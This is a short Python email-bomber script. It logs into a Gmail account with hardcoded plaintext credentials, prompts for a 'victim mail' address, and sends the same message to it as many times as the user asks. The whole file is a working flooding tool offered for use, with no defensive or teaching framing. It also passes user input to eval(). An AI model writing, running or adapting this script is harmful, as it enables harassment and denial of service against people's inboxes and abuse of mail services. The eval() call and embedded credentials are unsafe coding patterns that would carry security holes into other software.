import smtplib  # for SMTP Protocol
import mimetypes  # converts URL
import sys  # for System
import time  # time
from email.mime.text import MIMEText


class SMTP(object):
    def SMTPconnect(self):
        self.smtpserver = 'smtp.gmail.com'
        self.smtpport = '587'
        try:
            self.mailServer = smtplib.SMTP(self.smtpserver, self.smtpport)
        except IOError as e:
            print('Error: %s' % (e))
            time.sleep(5)
            sys.exit(1)
        self.mailServer.starttls()
        self.username = 'testbombmailpy@gmail.com'  # Username
        self.password = 'bombtest'  # password
        try:
            self.mailServer.login(self.username, self.password)
        except BaseException as e:
            print('Error: %s' % (e))
            time.sleep(3)
            sys.exit(1)

    def buildemail(self):
        self.From = 'testbombmailpy@gmail.com'
        self.To = input("\nPlease enter a victim mail (a gmail address)\nTo: ")
        self.Subject = input("\nSubject: ")
        self.Message = input("\nMessage: ")
        mensaje = MIMEText(self.Message)
        mensaje['From'] = self.From
        mensaje['To'] = self.To
        mensaje['Subject'] = self.Subject
        self.ammount = eval(input("How Many times would you like to send email: "))
        x = 0
        while x < self.ammount:
            self.mailServer.sendmail(self.From, self.To, mensaje.as_string())
            print("Total mails sent :",x)
            x += 1
        print("Send %d messages to %s" % (self.ammount, self.To))
        time.sleep(7)
        print("Well Done !")

    def lancement(self):
        s = SMTP()
        s.SMTPconnect()
        s.buildemail()

